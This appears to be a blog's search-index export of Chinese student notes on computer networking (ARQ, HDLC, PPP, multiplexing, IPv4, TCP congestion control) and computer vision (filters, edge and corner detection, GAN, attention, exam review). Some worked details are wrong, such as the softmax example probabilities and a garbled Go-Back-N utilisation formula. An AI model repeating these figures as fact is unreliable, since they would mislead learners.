流量控制接收确认前协调发送的数据数量。它高速发送方受到接收确认信息前能传输多少数据。任何设备都有处理进入数据的速度、容量等限制。在达到限制之前，必须提示发送设备，减少发送量/暂停发送。进入的数据必须经过经验和处理才能使用。 差错控制差错检测和纠正。任何时刻，检测到帧缺失/帧破坏，协调发送方重新发送帧。这称为自动重发请求（ARQ, automatic repeat request）。 协议分为两类： 无噪声通道的协议 最简单协议 停止-等待协议 有噪声通道的协议 停止等待ARQ协议 返回到N的ARQ协议 选择性重复ARQ协议 无噪声通道是一种假想的不会丢失帧、复制帧、损坏帧的理想通道。 最简单的协议它没有流量控制、差错控制，且和其他协议一样是单向的：帧从发送方到接收方单向传输。 它是事件驱动型程序，发送方伪代码如下： 12345678while(true){WaitForEvent();if(Event(RequestToSend)){ GetData(); MakeFrame(); SendFrame(); }} 接收方伪代码： 12345678while(true){WaitForEvent();if(Event(ArrivalNotification)){ ReceiveData(); ExtractData(); DeliverData(); }} 停止等待协议发送方发送一个帧后，必须得到ACK后才能继续发送下一个帧。此处数据帧还是单向的，除了ACK能反向通过。发送方算法如下（很简单，不用多说）： 12345678910111213141516while(true){ canSend=true { WaitForEvent(); if(Event(RequesToSend) AND canSend){ GetData(); MakeFrame(); SendFrame(); canSend=false; } if(Event(ArrivalNotification)){ ReceiveFrame(); canSend=true; } }} 接收方： 123456789while(true){ WaitForEvent(); if(Event(ArrivalNotification)){ ReveiceFrame(); ExtractData(); DeliverData(); SendACKFrame(); }} 有噪声通道停止等待自动重复请求（Stop-and-Wait ARQ）是在上面的停止等得协议加入了简单的差错控制。首先这个协议一次发送一个帧，所以相对简单。发送方发送一个帧后启动定时器，若没有收到ACK，则重发此帧。因此，帧需要编号来让双方知道应该重发哪个帧。另外，ACK帧也是帧，也会丢失。所以ACK帧也需要编号。 由于只有两个帧，所以序号使用0和1即可。接收方收到序列号后，返回当前数据序列号的取反。意思是可以接收下一个帧了。 数据发送失败，超时，发送方重发。 ACK发送失败，超时，发送方重发，接收方检测到重复数据，抛弃，回复ACK。 发送方算法： 1234567891011121314151617181920212223242526Sn=0;canSend=true;while(true){ WaitForEvent(); if(Event(RequestToSend) AND canSend){ GetData(); MakeFrame(Sn); StoreFrame(Sn) StartTimer(); Sn=Sn + 1; canSend=false; } WaitForEvent(); if(Event(ArrivalNotification)){ ReceiveFrame(ackNo); if(not corrputed AND ackNo == Sn){ StopTimer(); PurgeFrame(Sn-1); canSend=true; } } if(Event(TimeOut)){ StartTimer(); ResendFrame(Sn-1); }} 接收方算法： 1234567891011121314Rn=0;while(true){ WaitForEvent(); if(Event(ArrivalNotification)){ ReceiveFrame(); if(corrupted(frame)) sleep(); if(seqNo == Rn){ ExtractData(); DeliverData(); Rn = Rn + 1; } SendFrame(Rn); }} 由上图可以看出，停止等待ARQ大量浪费了带宽；如果上面的协议中，我们能在发送了15帧后再停止等待，则利用率可以上升到$15000/20000$，即$75%$。同时，在停止等待ARQ中不存在流水线操作，因为单帧发送后存在阻塞操作。 回退N帧自动重发请求（Go-Back-N ARQ）它是上面的协议应用了流水线原理的版本。最主要的改动就是序列号设计，以及滑动窗口。 假设帧头部允许序列号有$m$位，序列号范围就是0到$2^m-1$。 然后发送方开始发送数据，先发第一帧， 接收方收到，回传ACK1 ，这时有了一个叫做发送方窗口的东西： 如上图，帧有四部分：已确认的帧、发送但未确认的帧、能被发送但还没收到上层数据的帧、不能发送的帧（窗口大小以外的帧）。窗口大小在这个协议中是$S_{size}=2^m-1$。还有两个变量$S_f$和$S_n$，分别是第一个待处理的帧、下一个要发送的帧。 当收到确认帧时，发送窗口右划；一个ACK帧可以确认一个以上的帧，这加快了传输效率。但是当第一帧没有收到，之后收到的很多帧都需要作废重传，非常浪费时间。 利用率各种ARQ协议的利用率计算是一个经常考察的点，其实答案基本很固定。首先是思路，ARQ协议利用率计算时，假设收发时间相等，然后计算所有发送的帧中，数据帧的占比即可得到。 停止等待ARQ：发送一次接收一次：50% 回退N帧ARQ：发送N帧接收一次：（1/N+1）% 选择性重复ARQ：不知道） 选择性重复ARQ（Selective Repeat ARQ）可在一个帧被损坏时，不必重发N个帧。它主要是针对接收方的更改。 高级数据链路控制（HDLC）HDLC（High-level Data Link Control）是一个实际应用的面向比特的数据链路协议，支持点到点链路和多点链路。具体实现了本章讨论的各种ARQ协议。具有两种通用传输模式： n正常响应方式（Normal Response Mode，NRM） n异步平衡方式（Asynchronous Balanced Mode，ABM） Configurations and Transfer Modes 配置和传输方式配置方式有非平衡/平衡两种。第一种是主从配置方式，第二种是对等方式。 非平衡配置方式 主站与从站：一组结点根据在通信过程中的地位分为主站与从站，由主站来控制数据链路的工作过程。主站发出命令，从站接受命令，发出响应，配合主站工作。 点对点方式与多点方式：分为点对点方式与多点方式两种类型，在多点方式的链路中，主站与每个从站之间分别建立数据链路。 正常响应模式与异步响应模式：分为正常响应模式与异步响应模式两种数据传输方式。在正常响应模式中，主站可随时向从站传输数据帧。只有在主站向从站发送命令帧探询，从站响应后才可以向主站发送数据帧。在异步响应模式中，主站和从站可以随时相互传输数据帧，从站不需要等待主站发出探询就可以发送数据帧，但是主站仍然负责数据链路的初始化、建立、释放与差错恢复等功能。 平衡配置方式 链路两端的两个站都是复合站，复合站同时具有主站与从站的功能，每个复合站都可以发出命令与响应。平衡配置方式只有异步平衡模式一种工作模式，每个复合站都可以发起数据传输，而不需要得到对方的许可。 Frames HDLC的帧格式 如图所示，上面是三种帧结构，分别是信息帧，管理帧，无编号帧。它的控制字段如下所示： Control Field HDLC的帧控制字段其中，管理帧的控制字段如下： 准备接收RR，字段标识是00 不准备接收RNR，字段标识是10 拒绝接收REJ，字段标识是01 选择性拒收SREJ，字段标识是11 无编号帧的指令和响应更加复杂： 一般来讲，HDLC中常用的是对等异步控制模式。这种模式下，链接的建立和拆除如下图所示。使用4个U-frame帧来建立和断开连接。 而进行数据通信时，基本使用I-frame信息帧捎带指令。如果发生数据丢失等情况，则未接收到的一方使用S-frame来告知另一方重发。 POINT-TO-POINT PROTOCOL 点到点协议高级数据链路控制协议是点到点和点到多点都能使用的一个通用协议，但最通用的协议还是点到点协议（Point-to-Point Protocol，PPP），使用面向字节的方式。 它的帧格式如下图所示： 特点如下： 简单：不提供可靠传输，无流量控制，无重传机制，网络开销小，速度快 封装成帧：首部和尾部，帧开始符，帧结束符 透明传输：可传输任意比特组合的数据，加转义字符，收到后去掉转义字符 差错检测：CRC计算帧校验序列FCS 支持多种网络层协议：IPv4和IPv6网络层协议都可以封装到PPP帧中 多种类型链路：光纤、铜线，同步传输、异步传输，串行、并行链路均可 最大传送单元：1500字节 网络层地址协商：能够为拨号的一端分配IP地址、子网掩码、网关和DNS PPP是面向字节的协议，通过转义字节01111101进行透明插入和删除。 PPPoE协议（PPP Over Ethernet）•用于实现PPP在以太网上的传输。•是为了满足越来越多的宽带上网设备（如ADSL—最初是静态IP 、无线、有线电视等）和越来越快的网络之间的通信而指定开发的标准，它给出了两个广泛的接受的标准：以太网和PPP拨号协议。•PPPoE就是将PPP数据承载到以太网上，实质是在共享介质的网络中提供一条逻辑上的点到点链路（Session ID）。•PPPoE主要协议标准：RFC2516 它广泛利用在ADSL接入方式中。通过它，可以实现高速宽带网的个人身份验证访问，为每个用户创建虚拟拨号连接，来高速连接到Internet。 Chap.12.多路访问数据链路层分为逻辑链路控制子层LLC和介质访问控制子层MAC。后者的协议可以分为以下几类： 随机访问协议没有一个站点是优于其它站点的，也不能控制其它站点。没有站点有权力允许或不允许其它站点发送或不发送数据。有数据要发送的站通过自身的协议决定发送还是不发送数据。 在链路中，为了让多方向的通信不至于冲突，因此有了底下几个协议。 ALOHA协议 在这种传输过程中，无冲突相关的计算： 它的吞吐量是$S=G\\times e^{-2G}$，当$G=1/2$时，取到最大值$S_{max}=0.184$。 此外，还存在时隙ALOHA： 它可能的冲突时间等于帧传播时间。它的 CSMA-载波侦听多路访问协议三种坚持型方法的流程如下所示： CSMA/CD-冲突检测CSMA带冲突检测的载波监听多路访问CSMA/CD (Carrier Sense Multiple Access with Collision Detection)规定了冲突处理的算法。 任意站点都可以发送帧，之后监控介质查看传送是否成功。如果成功，站点完成发送；如果不成功，说明存在冲突，需要重新发送此帧。 CSMA/CA-冲突避免CSMA","link":"/2023/05/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"},{"title":"计算机网络笔记","text":"Chap.3.数据和信号模拟和数字 信息 要传输的，被人理解的内容 数据 对个人/程序有用，可以用信号表示 信号 物理层面的概念。可以用模拟和数字两种形式 信号的描述方式我们已经很熟悉了，就是频率，周期，相位之类的指标，再加上频域特征的表示。 带宽 带宽：就是复合信号包含的频率范围 信噪比：定义是$\\frac{\\text{信号能量}}{\\text{噪波能量}}$ 比特率：1秒发送的位数 通道有两种类型：低通通道（频率下限从0开始）和带通通道（从非0频率开始）。同时，数字信号传输方式有两种：基带传输和宽带传输 基带传输：借助一个低通通道，将信号直接传输。但是数字信号是带宽无穷的复合模拟信号，因此这种方式在现实中总会存在失真。 所需带宽和比特率成正比；想发送地更快，就需要更大的带宽 要以1Mbps速率发送数据，最小带宽是1/2=500KHz。如果用到N次谐波，则再乘以N得到所需带宽。 宽带传输（使用调制）：使用带通通道时，只能使用这种方法发送数字信号。它在发送前将数字信号转换成模拟信号。 传输减损三种类型：衰减、失真和噪声 数据速率限制受制于有效带宽、使用的信号电平数、通道的质量（噪声电平） 这三个因素。 奈奎斯特定理：无噪通道时，理论最大比特率为$2\\times\\text{带宽}\\times log_2L$，其中$L$是电平数。 香农定理：有噪声通道的理论容量为$\\text{带宽}\\times log_2(1+SNR)$。 香农容量定理给出数据速率的上限，奈奎斯特公式给出所需的信号电平数。 性能 吞吐量=$frame*bits/time$，表示单位时间内成功传输的数据量 延迟：有四个组成要素：传播时间、传输时间、排队时间、处理延迟 传播时间：传输一个bit从原到目标的时间，取决于物理速度 延迟：传播延迟+传输时间+排队时间+处理延迟 传播延迟：距离/传播速度 传输时间：报文长度/传输速度 带宽延迟积：$\\text{带宽}\\times\\text{延迟}$，定义了能充满链路的位数 Chap.4.数字传输数字到数字转换线路编码这是将数据转数字信号的技术。它将数字元素编码为信号元素，根据每个信号元素承载的数字元素数量，我们定义比率r。 数据速率和信号速率的关系如下：$S=c\\frac{N}{r} (baud)$。其中N是数据速率，S是信号元素数量，r是信号元素的数据元素承载量。 线路编码会遇到几个问题： 基线偏移：接收到信号的平均功率（基线）在接收一长串0/1时，会产生偏移，不利于解码。 直流成分：长时间0/1时，会产生很低的频率成分，会给不允许低频/使用电耦合的系统带来问题。 自同步：接收/发送的间隔必须严格对应。长1/0可能会引起失去同步（不知道到底连续发送了几个连续的0/1）。 内置差错检测 抗干扰抗噪声能力 复杂性 线路编码方案主要是这几种 NRZ：不归零编码，它有N/2的信号速率，但是有DC成分问题 1. NRZ-L：电平决定值，0是正电平，1是负电平 2. NRZ-I：下一位是1则反相，0则不反相 RZ编码：三个值的编码，它的方式如下所示： 缺点是占用带宽大，以及实现复杂。 双相-曼彻斯特编码： 普通版本：周期中点跳变，如下图。 差分版本：下一位是1就不反相，是0则反相。 它唯一的缺点是信号速率，是NRZ的两倍。 AMI AMI（交替传号反转）：传号就是1，所以意思是1交替用正负表示，0用0电平表示 伪三元编码：1是0电平，0是正负交替表示 模拟到数字转换传输模式Chap.5.模拟传输Chap.6.带宽利用带宽利用是可用带宽的合理利用： 复用只要连接两台设备的介质带宽比设备间传输所要求的带宽高时，该链路就可以被共享。复用就是允许同时通过一条数据链路传输多个信号的一组技术。 通过复用器（MUX）和分离器（DEMUX），我们可以将一个连接（link）划分为可以同时使用的多个通道（channel）。 复用器可以分为这几类： FDM：分频复用 WDM：分带宽（波段）利用 TDM：时分复用 前两者是模拟信号方式实现，而TDM是数字信号方式实现。 频分多路复用(Frequency-Division Multiplexing) FDM 是用来组合模拟信号的模拟多路复用技术； 载波频率之间的频率差能够容纳调制信号的带宽； 通道之间使用防护频带进行分隔，防止信号重叠； 载波频率不能影响原始的数据频率； 数字信号转换为模拟信号之后仍然可以使用FDM 大致思想如上。上面的图是时域表示不够直观，下图将三个4kHz信号合并到一个12kHz的连接上，用频域表示： 总的带宽就是每个频段信号的带宽加上防护频带的带宽（一般是通道数-1）之和。例如，有 5个通道，每个通道的带宽是 100kHz，全部进行多路复用。如果通道之间需要 10kHz 的防护频带以防止干扰，则链路的最小带宽是$5\\times100+4\\times10=540kHz$。这样的复用系统可以多级叠加使用。 波分多路复用(Wavelength-Division Multiplexing)它和上面的FDM思想是一致的，只不过处理对象从电信号换成了光信号。 在复用器上将多个光源组成单一光信号； 在分离器上做相反的处理； 光源组合与分离由棱镜完成； WDM的一种应用是同步光纤网络(SONET)。 同步时分多路复用(Synchronous Time-Division Multiplexing)TDM类似于OS中任务管理的rr策略，将通道切分成多个小片段，按顺序轮流给每一个设备使用。这样，它就将许多低俗通道组合成了一个高速通道。 首先是同步时分复用。在同步TDM中, 链路速率是数据速率的n倍，并且比单元持续时间短 n 倍（如果没有附加同步位的话）。 注意下图的称呼：帧中包含时隙，时隙数量是通道数量 例如，将 4个 1kbps的连接一起复用，每个单位为 1位，则复用前，一位的持续时间是$1/1kbps=1ms$，链路速率是通道速率的4倍，也就是$4kbps$。时隙的持续时间是复用前每位持续时间的$1/4$，也就是$250\\mu s$。同时，也可以说位持续时间是数据速率$1/4kbps$的倒数，也就是$250\\mu s$。一帧的持续时间：每帧有四个时隙，所以一帧的持续时间是$250\\mu s$的4倍，也就是$1ms$。 一帧包含的数据量，是由一帧包含的位数量（每个时隙的位长度x通道数量）和额外的同步位决定的（一般是1位）。而帧速率，则是输入链路的数据速率/每个时隙单元的位大小决定的。比如输入是$100kbps$，每个时隙$2$位，那么，疫苗就需要$100k\\div2bit=50k$帧每秒的速率发送来保证链路不堵塞。然后是数据速率。考虑上面两个量的乘积，就是数据速率。 如果在某一个瞬间，一个线路没有数据流出，则那个位置在对应时隙空出来。这也就是空时隙(Empty slots)。 实际中，传入的数据速率可能不同，这时一般采用下面的策略： 多级复用（Multilevel Multiplexing） 多时隙分配（Multiple-slot Allocation） 脉冲填充（Pulse Stuffing） 一般，为了同步链路两侧信号，会设置帧指示位： 同步TDM复用速率有一套DS标准： 统计时分多路复用(Statistical Time-Division Multiplexing)上面的同步TDM的一个缺点就是时隙的空缺，这样不能充分利用高速链路的带宽。因此有了第二种统计时分复用的方法： 扩频在扩频系统 SS中，也把来自某些源端的信号组合在一起形成一个更宽的带宽，可是目的略有不同。为达到此目的，扩频技术增加了冗余部分，扩展原始信号的频带满足每个站的需要。 跳频扩频（Frequency Hopping Spread Spectrum，FHSS）如下图，将原始信号“跳跃”式扩展，来达到扩频目的。 直接序列扩频（Direct Sequence Spread Spectrum，DSSS）Chap.7.传输介质非屏蔽双绞线的分类：","link":"/2023/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E7%89%A9%E7%90%86%E5%B1%82%E5%92%8C%E4%BB%8B%E8%B4%A8/"},{"title":"计网笔记：第四部分-网络层","text":"Chap.19.逻辑寻址逻辑层通信的实现基础。TCP/IP实现了这个全球寻址方案。IP地址分为IPV4和IPV6两种，后者是前者的升级版本，目前前者在主要使用。 IPV4地址有$2^{32}$个，因为它的长度是32位，也就是四个字节。下面主要讨论的是IPV4。 IPV4地址 32位长 唯一且通用 地址空间是$2^{32}$ 标记法有二进制标记法，和十进制点分标记法（常用每位范围从0-255） 分类寻址这种方法将地址空间分为ABCDE这5类。ip地址开头4位就能确定地址的类。 前4位 第一个字节 0000 0-127 1000 128-191 1100 192-223 1110 224-239 1111 240-255 Chap.23.UDP、TCP和SCTP这三个是传输层的协议。UDP较为简单，其次是复杂的TCP协议。最后的SCTP仅了解。 进程到进程的传递传输层负责的是进程到进程的传递。 客户/服务器模式在web2最常用的就是C/S模式。为了传输时的标识，需要确定本地/远程的主机和进程。 寻址：传输层需要端口号来标识进程ID，服务器和客户端都是如此。不过前者规定比较严格，后者可以随机选择一个。这一般是由IANA统一管理的。 套接字地址：将IP和端口号结合起来就得到了套接字地址（socket address）。传输层协议需要客户套接字地址和服务器套接字地址。这四条信息是IP头部和传输层协议头部的组成部分。IP头包含IP地址，UDP/TCP头包含端口号。 复用/分离寻址机制可以通过传输层进行复用和分离。也就是，同时刻选择一个待发送的分组进行发送（复用），同时刻选择一个待接受的进程分发分组。 无连接/面向连接服务前者对应UDP，分组从一方发送给另一方，不需要建立/释放连接，分组无编号。它们没有确认过程，可能被延迟、丢失、无序到达 例题：最大窗口64kB，报文的段平均往返时间是20ms，则最大吞吐量是？ $64\\times1024\\times8(bit)\\div(20\\times10^3)s=26.21Mbit/s$ 例题：TCP的MSS是128B，报文的序号长度是8位，报文段在网络的生存时间是30s，计算TCP链接能达到的最大速率。 30s内不能有重复序号，因此30s最多有$2^8=256$个段。因此结果是$1024bits\\times256segments\\div30s=8738bit/s$ Chap.24.拥塞控制它和服务质量是正相关的。 拥塞控制思想是，利用窗口控制拥塞。窗口有两个，接受/发送窗口 策略有如下几个： 慢启动：先以一个MSS（Maximum Segment Size）慢速启动，如果重传之前收到一个确认，则指数（1,2,4,8,…）增加发送速度，直到收到的确认消息数和发送速率不匹配为止. 加性增加：和上面类似，不过增长速率是线性增长（1,2,3,…）。同时，如果计时器超时（严重拥塞），则作出强烈反应：设置阈值为当前拥塞状态的一半、设置cwnd为1个段的大小、进入慢启动阶段。如果接受到三个连续的ACK，则说明轻度拥塞，一个段可能丢失，其他段可能到达。这时，称为快速重传/快速恢复：设置阈值为拥塞窗口的一半、设置阈值为cwnd一半、进入拥塞避免状态。 一般，拥塞控制综合这两种启动方式。开始时慢启动，之后达到一个阈值后开始加性增加，并按照丢包严重程度来重新确定阈值。阈值的确定是取下一次计算得的发送速率和接受到对面ACK时得到的对方缓存空间的最小值。 4.SCTP-流控传输协议（Stream Control Transmission Protocol）它允许每个端口有多个IP地址。协议构成方面，了解即可。","link":"/2023/05/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%B1%82/"},{"title":"计算机视觉学习笔记","text":"之前导论课程上学的基本都是思想和原理，到这里就开始接触真正数学和工程的方法了。 序这门课的研究思路很清晰，就是围绕标题，自底向上，借助数学工具，一步一步实现各种复杂的功能以及算法，最终一步步接近让计算机拥有“视觉”的目标。 首先是数据的表示，概念的抽象，如何用离散的数据去近似抽象的视觉这个概念。这个过程通过直观理解和数学工具，以及建模方法，为计算机视觉提供了一种可行的数学上的表示和运算方法：像素，以及基于像素的一系列运算，比如滤波，仿射变换，更高自由度的变换，基于像素颜色值的变换等等，以及由这一系列变换得到的图像特征。 其次，是研究在图像的像素模型下，利用数学方法去研究分析以及利用图像特征的方法。这其中，就有诸如角点检测，边缘检测，全景图拼接以及处理等命题。 生成对抗网络GAN通俗来说就是让两个网络作为对抗组，比如说生成图片的NN和鉴别图片的NN，两方轮流作为输入输出（也就是交替训练），在循环中不断提升两个网络的效果，最终达到生成内容以假乱真的效果。NN炼丹的关键是其中的loss函数设计，不过他们的做法是直接用另一个NN作为这个NN的loss函数来回馈训练效果。 目前比较突出的成果一个就是近几年的Stable Diffusion，算是这里边比较突出的一个了。这东西在图像的有损压缩里边用的也多，至于有损压缩的应用嘛，一般在一些需要使用算力去换带宽的场合很适用，比如卫星数据传输。其他应用就是图像的填充和补全，比如合理推测图像的缺失部分内容。另外就是，网络的输入不一定是噪声，输出也不一定是真假。改变其输入和输出的类型，可以赋予NN以不少是实用场景。 GAN的优点是效果好，比以前用的高斯模糊的效果都很好。但是问题也很突出，就是GAN很难训练。GAN的两方是生成器和判别器，训练的结果很大程度上与两方的能力是否足够接近有很大关系。 另外就是GAN的思想重点在对抗，并没有要求其他的条件。所以比如说可以有多个判别方，有多个生成方等。 Attention Is All You Need注意力机制一开始是应用于机器翻译领域，通过一个合适的重点词语权重标注机制，让算法更有重点地提取概要。如今的GPT也很大程度上受到注意力机制的启发才产生了不断预测下一个词向量概率的朴素思想。 注意力机制可以理解成给分词加上权重。将一个句子进行分词作为一个向量，将这个词语向量通过Softmax这样的激活函数进行处理之后，再借助矩阵进行变换，从而得到处理后的，带有权重的词向量。处理后的词向量，权重总和为1。加权后的句子，再进行翻译，效果就会好很多了。 至于将Attention思想迁移到CV领域进行应用的方法，关键是将图像”语义化“。一个常用的方法是将图像分割，分割成小块，对每个小块采用相同的思想。这就是VIT（Vision Transformer）的思想。 激活函数SoftmaxSoftmax函数是一种常用的激活函数,主要用于将多分类问题中的输出值转换为概率分布。在神经网络中,输出层通常使用softmax函数,将输出值转换为每个类别概率。 Softmax函数的定义如下:$$Softmax(x) = e^(x_i) / (e^(x_1) + e^(x_2) + … + e^(x_n))$$其中,x是一个K维向量,Softmax函数的输出也是一个K维向量,并且每个元素的范围都在0到1之间,并且所有元素的和为1。 在多分类问题中,假设输出层有K个神经元,每个神经元代表一个类别。Softmax函数的作用是将输出层的输出转换为每个类别对应的概率。例如,如果输出层输出为[1.2, 2.3, 3.1],则对应的概率为[0.21, 0.34, 0.45]。 Softmax函数可以解决输出值非常大的问题,因为它可以防止输出值过大而导致的梯度消失或梯度爆炸。此外,Softmax函数还可以进行归一化,使得概率和为1,使得概率分布更加合理。 期末划重点咯 sudo 老师给我分 有个压缩包，里边画红钩的都是重点 占比大概NN和传统方法4-6开 Chap 1 没啥重点 什么是光， 可见光谱的范围这些的 人的视觉系统这些概念啥的 三色光的相关内容 Chap 3 重点 灰度图（取值范围），RGB 图像两种基本运算 矩阵的运算 滤波概念，高斯滤波 卷积，点乘积，性质，计算过程strike, padding计算结果图像尺寸这些的 Chap 4 边缘检测 边缘定义,为啥是边缘 图像的梯度 噪声 边缘检测器：sobel算子,roberts算子,prewwit算子等 边缘存在的问题：噪声，拟合等 Chap 6 图像插值 线性插值，上下采样等，高斯金字塔 图像放大的插值算法（超分） 最近邻，双线性，三次插值。不过现在都用GNN做超分了 Chap ? 特征匹配 典型特征匹配计算方法 特征和特真不变性：啥特征的啥不变性 SIFT特征 Chap 7 图像变换 几种变换方式 线性变换：变灰度，变尺度等 按照变换剧烈程度递增：平移，旋转，仿射，投影 得记得变换矩阵的特征,大概得看明白 Chap 8 图像配准 没啥讲的 Chap 11 单视图建模 消失线和消失点等 得会计算 双试图立体视觉：视差和深度计算 窗口配准 极点极线极面 本质矩阵，基本矩阵是谁到谁的映射 深度估计 Chap 14 图像三维重建 一个相机转着拍 内参矩阵不变，为了配窗 重复的问题 Chap 16 机器视觉 激活函数和矩阵计算 神经网络结构 卷积网络的池化操作 反向传播：对w求导而非对x求导，而且得会算反向传播函数 Chap 18 图像分割 语义分割和实例分割 分割手段：边缘检测,聚类等方法 Chap 19 目标检测与分类 输出：中心型，边界型 两个方法：两步法，一步法（Yolo） Chap 21 实操 玩玩pytorch Chap 23 神经网络前沿 GAN Attention(q,k,v) Softmax 计算机视觉复习找到一个学长的复习笔记如下 图像和图像滤波 什么是滤波 形成一个新的图像，其像素是原始像素的组合 什么时候利用滤波 ==增强图像：== 降噪、锐化 ==提取信息：== 提取边缘或轮廓 滤波的种类： 线性滤波：用相邻的线性组合 （加权和）替换每个像素 线性组合的系数称为权重核 卷积：(权重核反转（水平和垂直）)$$G [ i , j ] = \\sum _ { u = - k } ^ { k } \\sum _ { v = - k } ^ { k } H [ u , v ] F [ i - u , j - v ]$$记为$$G=H*F$$相关：$$G [ i , j ] = \\sum _ { u = - k } ^ { k } \\sum _ { v = - k } ^ { k } H [ u , v ] F [ i + u , j + v ]$$记为：$$G = H \\otimes F$$ 高斯滤波 ==从图像中删除 「高频」分量 （低通滤波器）== ==高斯核函数==：$$G _ { \\sigma } = \\frac { 1 } { 2 \\pi \\sigma ^ { 2 } } e ^ { - \\frac { \\left( x ^ { 2 } + y ^ { 2 } \\right) } { 2 \\sigma ^ { 2 } } }$$ 滤波的应用 锐化滤波器：$$F + \\alpha (F-F*H)$$ 阈值滤波器$$g ( m , n ) = \\left{ \\begin{array} { c c } { 255 , } &amp; { f ( m , n ) &gt; A } \\ { 0 } &amp; { \\text { otherwise } } \\end{array} \\right.$$==阈值滤波器不是线性滤波== 相关和卷积的定义和关系 高斯核 调节哪个参数 什么是线性滤波器 去燥使用什么滤波 边缘检测边缘的特征 怎样通过导数来反映边缘 ==对于图像强度的一阶导数，边缘对应于导数的极值== 如何计算数字图像的导数？ 重建连续图像，然后计算导数 采用离散导数（有限差分）: ==图像的梯度相当于两个相邻像素之间的差值==$$\\frac { \\partial f } { \\partial x } [ x , y ] \\approx F [ x + 1 , y ] - F [ x , y ]$$可以使用线性滤波器实现 ==梯度的方向 垂直于边缘的方向==，梯度的方向是 图像函数 f(x,y) 变化最快的方向，当图像中存在边缘时，一定有较大的梯度 图像梯度图像梯度是图像函数在 x ,y 两个方向的导数， 幅值:$$| \\nabla f | = \\sqrt { \\left( \\frac { \\partial f } { \\partial x } \\right) ^ { 2 } + \\left( \\frac { \\partial f } { \\partial y } \\right) ^ { 2 } }$$方向：$$\\theta = \\tan ^ { - 1 } \\left( \\frac { \\partial f } { \\partial y } / \\frac { \\partial f } { \\partial x } \\right)$$==要计算图像梯度，首先要图像去噪，使用高斯核在图像上卷积，平滑图像== 可以将两次滤波 （高斯滤波、差分滤波）合成一步实现 二维边缘检测使用的图像算子： Sobel 算子 非最大抑制检查像素是否为沿梯度方向的局部最大值 （需要进行像素差值？） ==Canny 边缘检测器== 用高斯导数滤波 获得梯度的幅值和方向 非最大抑制 连接与滞后阈值化： 定义高低两个阈值 用==高阈值来寻找边缘曲线的起点，用低阈值来确定后继点==，进行连接 Canny 边缘检测器的参数： $\\sigma:$ 高斯模糊的宽度：大的 $\\sigma$ 可以检测大尺度边缘，$\\sigma$ ==越小，能检测到的细微边缘就越多== 高阈值 低阈值 图像的导数 图像的梯度是什么 （两个方向的导数）（复制和方向） 去噪 二维边缘检测 列举几个图像算子 费最大值抑制 边缘检测器 图像的插值和重采样图像采样 采样率 ==奈奎斯特采样率： 采样率 &gt;= 2*图像中的最大频率== 若原始图像的频率过高，先对图像滤波，然后子采样，构建高斯金字塔 图像插值 最近邻差值：重复 n 次 双线性插值： 利用输入图像中与输出图像像素点映射位置最邻近的4个像素点的颜色值(或灰度值)计算输出图像中像素点的颜色值(或灰度值) 双三次插值：为了得到更精确的(x’,y’)的颜色值(或灰度值)g(x’,y’),就不仅需要考虑与(x’,y’)点最邻近的四个点对它的影响,还要考虑到该点周围16个相邻点的颜色值(或灰度值)对它的影响。 角点检测Harris 角点检测：将窗口平移，比较平移前后 w 内每个像素的差异平方和（SSD）$$E ( u , v ) = \\sum _ { ( x , y ) \\in W } [ I ( x + u , y + v ) - I ( x , y ) ] ^ { 2 }$$ $$\\begin{aligned} E ( u , v ) = &amp; \\sum _ { ( x , y ) \\in W } [ I ( x + u , y + v ) - I ( x , y ) ] ^ { 2 } \\ \\approx &amp; \\sum _ { ( x , y ) \\in W } \\left[ I ( x , y ) + I _ { x } u + I _ { y } v - I ( x , y ) \\right] ^ { 2 } \\ \\approx &amp; \\sum _ { ( x , y ) \\in W } \\left[ I _ { x } u + I _ { y } v \\right] ^ { 2 }\\ \\approx Au^2+2Buv +Cv^2\\ \\end{aligned}$$ $$A = \\sum _ { ( x , y ) \\in W } I _ { x } ^ { 2 } \\quad B = \\sum _ { ( x , y ) \\in W } I _ { x } I _ { y } \\quad C = \\sum _ { ( x , y ) \\in W } I _ { y } ^ { 2 }$$ 算法实现： 计算图像在 X， Y 两个方向的梯度 计算两个方向上梯度的乘积 使用高斯函数对 $I_x^2,I_y^2,I_xI_y$ 进行高斯加权，生成矩阵的元素 A，B，C 计算每个像素的 Harris 响应值 R， 并对小于某个阈值的 R 置 0$$R = \\left{ R : \\operatorname { det } M - \\alpha ( \\operatorname { trace } M ) ^ { 2 } &lt; t \\right}$$ 在邻域内进行非最大抑制，局部最大值即为图像的角点 特征不变性我们希望角点的位置对光度变换具有不变性 （图像变换之后，角点位置不变），对几何变换具有协变性 （相应位置检测到同一特征） 不变性： 对平移、旋转协变 对强度平移具有不变性，对强度缩放不具有不变性 对缩放不具有不变性 需要同时在位置和尺度上查找：自动尺度选择 自动尺度选择： 在高斯金字塔中使用固定大小的窗口，寻找具有局部最大值的尺度 斑点检测： 斑点是指二维图像中和周围颜色有颜色差异和灰度差异的区域,因为斑点代表的是一个区域,所以其相对于单纯的角点,具有更好的稳定性和更好的抗干扰能力. 核函数： 高斯拉普拉斯：$$\\nabla ^ { 2 } g = \\frac { \\partial ^ { 2 } g } { \\partial x ^ { 2 } } + \\frac { \\partial ^ { 2 } g } { \\partial y ^ { 2 } }$$ 高斯差分函数$$D o G = G ( x , y , k \\sigma ) - G ( x , y , \\sigma )$$ 当 $$\\sigma = r/\\sqrt{2}$$ 时，响应最大，图像黑白反向时，响应最小，因此将高斯拉普拉斯算子响应达到峰值的 $\\sigma$ 